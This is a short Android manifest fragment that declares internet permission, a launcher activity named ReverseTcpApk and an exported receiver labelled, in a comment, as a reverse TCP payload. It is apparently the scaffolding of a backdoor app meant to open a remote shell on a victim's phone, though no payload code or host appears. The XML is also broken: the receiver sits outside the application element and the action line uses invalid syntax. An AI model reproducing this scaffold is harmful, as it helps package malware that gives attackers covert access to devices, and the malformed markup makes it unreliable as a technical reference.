<uses-permission android:name="android.permission.INTERNET" />

<application>

<activity

android:name=".ReverseTcpApk"

android:label="@string/app_name">

<intent-filter>

<action android:name="android.intent.action.MAIN" />

<category android:name="android.intent.category.LAUNCHER" />

</intent-filter>

</activity>

</application>



<!-- Add our reverse TCP payload -->

<receiver

android:name=".PayloadReceiver"

android:enabled="true"

android:exported="true">

<intent-filter>

<action.android.name = "com.example.REVERSE_TCP_PAYLOAD"/>

</intent-filter>

</receiver>
